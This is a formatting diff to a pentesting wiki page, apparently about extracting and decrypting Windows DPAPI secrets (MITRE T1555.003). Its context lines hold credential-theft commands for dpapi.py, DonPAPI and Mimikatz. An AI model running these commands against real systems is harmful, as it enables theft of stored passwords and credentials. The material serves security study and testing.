@@ -6,7 +6,7 @@ description: MITRE ATT&CK™ Sub-technique T1555.003
 
 ## Theory
 
-The DPAPI \(Data Protection API\) is an internal component in the Windows system. It allows various applications to store sensitive data \(e.g. passwords\). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:
+The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:
 
 ```bash
 C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
@@ -25,7 +25,7 @@ C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, DPAPI-data can be manipulated \(mainly offline\) with tools like [dpapick](https://github.com/jordanbtucker/dpapick) \(Python\), [dpapilab](https://github.com/dfirfpi/dpapilab) \(Python\), [Impacket](https://github.com/SecureAuthCorp/impacket)'s [dpapi.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py) and [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) \(Python\).
+From UNIX-like systems, DPAPI-data can be manipulated (mainly offline) with tools like [dpapick](https://github.com/jordanbtucker/dpapick) (Python), [dpapilab](https://github.com/dfirfpi/dpapilab) (Python), [Impacket](https://github.com/SecureAuthCorp/impacket)'s [dpapi.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py) and [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python).
 
 ```bash
 # (not tested) Decrypt a master key
@@ -39,7 +39,7 @@ dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk
 dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
 ```
 
-[DonPAPI](https://github.com/login-securite/DonPAPI) \(Python\) can also be used to remotely extract DPAPI secrets more easily. It supports [pass-the-hash](../../ntlm/pass-the-hash.md), [pass-the-ticket](../../kerberos/pass-the-ticket.md) and so on.
+[DonPAPI](https://github.com/login-securite/DonPAPI) (Python) can also be used to remotely extract DPAPI secrets more easily. It supports [pass-the-hash](../../ntlm/pass-the-hash.md), [pass-the-ticket](../../kerberos/pass-the-ticket.md) and so on.
 
 ```bash
 DonPAPI.py Domain/user:passw0rd@target
@@ -47,7 +47,7 @@ DonPAPI.py Domain/user:passw0rd@target
 {% endtab %}
 
 {% tab title="Windows" %}
-On Windows systems [Mimikatz](https://github.com/gentilkiwi/mimikatz) \(C\) can be used to extract, decrypt or use specific master keys using specified passwords or given sufficient privileges.
+On Windows systems [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can be used to extract, decrypt or use specific master keys using specified passwords or given sufficient privileges.
 
 ```bash
 # Extract and decrypt a master key
@@ -73,9 +73,7 @@ dpapi::cred /in:"C:\path\to\encrypted\file" /masterkey:$MASTERKEY
 
 {% embed url="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords" %}
 
-{% embed url="https://www.synacktiv.com/ressources/univershell\_2017\_dpapi.pdf" %}
-
-
+{% embed url="https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf" %}
 
 
 
